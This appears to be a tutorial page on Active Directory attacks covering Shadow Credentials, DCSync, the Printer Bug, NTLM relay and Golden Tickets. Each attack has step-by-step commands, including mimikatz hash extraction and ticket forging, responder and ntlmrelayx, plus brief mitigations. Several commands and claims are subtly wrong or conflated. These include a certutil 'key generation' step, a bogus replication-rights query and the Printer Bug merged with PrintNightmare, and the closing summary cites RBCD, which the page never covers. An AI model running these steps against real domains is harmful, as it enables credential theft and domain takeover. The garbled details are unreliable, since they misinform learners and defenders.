# 1.3 Active Directory Advanced Concepts

## Active Directory Advanced Concepts

### **1ï¸âƒ£ ğŸ´â€â˜ ï¸ Shadow Credentials Attack (Abusing Key Trust)**

#### **What is it?**

* **Windows Hello for Business (WHfB) and Azure AD Key Trust authentication** use a **certificate-based authentication** system.
* **An attacker can create a certificate for an AD user and log in as that user without resetting their password!**

#### **How to Exploit?**

ğŸ“Œ **Check which users have Key Trust enabled:**

powershell

```powershell
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
```

ğŸ“Œ **To perform the attack, generate a fake private key and certificate:**

powershell

```powershell
certutil -encode input.key output.pem
```

ğŸ“Œ **Now inject this fake certificate into the AD user object:**

powershell

```powershell
Add-KeyCredential -User "victim" -Certificate "attacker.pem"
```

ğŸ’€ **Now the attacker can log in as the "victim" user without resetting their password!** ğŸš€

#### **Mitigation:**

* **Monitor who is modifying "msDS-KeyCredentialLink".**
* **Analyze AD logs (Event ID 5136) to detect Shadow Credentials abuse.**

***

### **2ï¸âƒ£ ğŸ´â€â˜ ï¸ Domain Replication Attack (DCSync Attack)**

#### **What is it?**

* **DCSync attack** allows an **attacker to extract NTLM hashes directly from a Domain Controller.**
* This attack is useful for **extracting the krbtgt hash with domain admin privileges to maintain full persistence.**

#### **How to Exploit?**

ğŸ“Œ **Check which users have replication rights:**

powershell

```powershell
Get-ADUser -Filter * -Properties "Replicating Directory Changes"
```

ğŸ“Œ **If the attacker has obtained DA or high-privileged user access, execute DCSync:**

powershell

```powershell
mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

ğŸ”¥ **Boom! This command directly provides the krbtgt NTLM hash, making a Golden Ticket attack possible.**

#### **Mitigation:**

* **Grant Domain Controller replication permissions only to trusted users.**
* **Monitor Event ID 4662 and 4742 as they help detect DCSync attacks.**
* **Rotate the krbtgt password at regular intervals.**

***

### **3ï¸âƒ£ ğŸ´â€â˜ ï¸ Printer Bug Attack (MS-RPRN Exploit)**

#### **What is it?**

* The **Windows Print Spooler Service's Remote Procedure Call (RPC)** feature allows **low-privileged users to obtain SYSTEM privileges**.
* This is a **legacy Windows bug that has been exploited in many variations (PrintNightmare, MS-RPRN, CVE-2021-1675, CVE-2021-34527)**.

#### **How to Exploit?**

ğŸ“Œ **Check if Print Spooler is enabled on the target machine:**

powershell

```powershell
sc qc Spooler
```

ğŸ“Œ **Execute the MS-RPRN exploit and load an arbitrary DLL on the target machine:**

powershell

```powershell
Invoke-PrinterBug -ComputerName "victim-PC"
```

ğŸ”¥ **If successful, the attacker can execute commands with SYSTEM privileges!**

#### **Mitigation:**

* **If the Print Spooler service is not needed, disable it:**

powershell

```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

* **Print Spooler should always be disabled on Domain Controllers!**

***

### **4ï¸âƒ£ ğŸ´â€â˜ ï¸ NTLM Relay Attack (No Password Required!)**

#### **What is it?**

* **A major flaw in NTLM authentication is that an attacker can capture a user's challenge-response and forward the authentication without knowing the password.**
* This attack **works on SMB, LDAP, and HTTP services.**

#### **How to Exploit?**

ğŸ“Œ **First, set up Responder and capture NTLM hashes:**

bash

```bash
responder -I eth0 -wrf
```

ğŸ“Œ **Now relay the NTLM hash to SMB:**

bash

```bash
ntlmrelayx.py -tf target.txt -smb2support
```

ğŸ”¥ **If the target is vulnerable, the attacker can access SMB shares without credentials!**

#### **Mitigation:**

* **Enable SMB Signing to block NTLM relay attacks.**
* **Enforce LDAP Signing and Channel Binding.**
* **Don't grant unnecessary admin rights to domain users.**

***

### **5ï¸âƒ£ ğŸ´â€â˜ ï¸ Golden Ticket Attack (Permanent Domain Persistence)**

#### **What is it?**

* **In a Golden Ticket attack, the attacker obtains the krbtgt account hash and can create unlimited Kerberos tickets.**
* This means **the attacker gains permanent persistence in the domain, even if the user is deleted or the password is changed!** ğŸ˜ˆ

#### **How to Exploit?**

ğŸ“Œ **Extract the krbtgt NTLM hash using DCSync (as explained in the previous attack):**

powershell

```powershell
mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

ğŸ“Œ **Now generate a Golden Ticket:**

powershell

```powershell
mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt
```

ğŸ”¥ **Boom! The attacker has created a "forever-valid" ticket that can provide full domain access.**

#### **Mitigation:**

* **Rotate the krbtgt password every 90 days.**
* **Monitor Event ID 4769 and 4672 in your SIEM to detect unusual Kerberos activity.**
* **Implement strong Kerberos policies.**

***

### **ğŸ”¥ Final Thoughts**

ğŸ˜ˆ **If you're learning real-world AD exploitation, these advanced techniques are crucial.**\
âœ… **DCSync and Golden Ticket attacks are dangerous for domain-wide persistence.**\
âœ… **NTLM relay and Printer Bug attacks can elevate low-privileged users to SYSTEM access.**\
âœ… **RBCD and Shadow Credentials abuse are highly stealthy and powerful privilege escalation techniques.**
